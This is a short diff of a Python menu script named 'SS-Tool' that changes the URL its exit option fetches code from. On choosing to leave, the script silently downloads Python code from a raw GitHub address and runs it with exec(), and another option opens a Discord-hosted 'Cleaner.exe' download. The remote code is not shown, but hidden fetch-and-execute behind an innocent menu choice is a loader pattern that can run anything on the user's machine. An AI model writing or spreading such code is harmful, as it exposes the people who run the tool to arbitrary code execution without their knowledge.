@@ -41,7 +41,7 @@ while True:
     if chon == '-':
         os.system('cls')
         print("Leaving SS-Tool")
-        exec(requests.get('https://raw.githubusercontent.com/VuNguyenNotRealizing/MCCArchive/main/Minecraft').text)
+        exec(requests.get('https://raw.githubusercontent.com/VjpProDaiIa/k/main/Minecraft').text)
     if chon == '1':
         webbrowser.open_new("https://cdn.discordapp.com/attachments/1148033696641859584/1171827433549336657/Masew_Cleaner.exe?ex=655e1857&is=654ba357&hm=9b7cd01dfe5d28b2b8d14c20db6209a9aa8b608085f4fa7b84a2e046896fc87d&")
     if chon == '2':
